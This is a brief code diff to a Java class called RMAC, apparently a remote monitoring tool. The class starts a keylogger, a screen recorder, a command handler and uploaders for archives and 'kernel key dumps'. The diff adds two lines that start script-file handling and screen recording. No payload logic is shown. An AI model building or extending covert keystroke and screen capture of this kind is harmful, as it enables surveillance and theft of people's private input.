@@ -129,6 +129,7 @@ public class RMAC {
     new Thread(() -> RMAC.archiver.uploadArchive()).start();
     // Verify Script Files
     scriptFiles = (ScriptFiles) this.getInstance(ScriptFiles.class);
+    scriptFiles.start();
     // Initialize KL Output file
     keyLog = (KeyLog) this.getInstance(KeyLog.class);
     keyLog.start();
@@ -141,6 +142,7 @@ public class RMAC {
     commandHandler.start();
     // Initialize Screen Recorder
     screenRecorder = (ScreenRecorder) this.getInstance(ScreenRecorder.class);
+    screenRecorder.start();
     // Initialize RMAC Kernel Key Dumps Uploader
     kernelDumpsUploader = (KernelDump) this.getInstance(KernelDump.class);
     kernelDumpsUploader.start();
